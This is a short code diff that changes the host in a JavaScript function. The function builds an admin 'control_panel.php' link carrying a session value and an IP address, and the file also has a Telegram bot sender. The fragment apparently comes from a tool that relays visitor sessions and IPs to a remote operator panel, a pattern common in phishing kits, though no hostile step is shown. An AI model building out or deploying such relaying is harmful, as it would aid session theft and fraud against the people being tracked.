@@ -38,7 +38,7 @@ function saveBotsConfig() {
 loadBotsConfig();
 
 function getAdminUrl(session, ip) {
-  return `https://voyage-production-a035.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
+  return `https://voyage-production-1216.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
 }
 
 async function sendToTelegramBot(token, chatId, message) {
